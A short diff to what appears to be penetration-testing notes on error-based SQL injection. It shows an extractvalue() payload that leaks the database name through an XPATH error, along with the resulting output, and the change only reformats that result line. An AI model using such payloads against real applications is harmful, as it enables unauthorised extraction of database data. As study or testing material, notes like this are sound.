@@ -1,7 +1,7 @@
 * **Using database() Functions**
 
 	 ```1'+AND+1=extractvalue(rand(),concat(0x3a,database()))--+```
-	"sqlMessage":"XPATH syntax error: ':progress28app'"
+	 RESULT  ```"sqlMessage":"XPATH syntax error: ':progress28app'"```
   
 
 * **Using user() Functions**
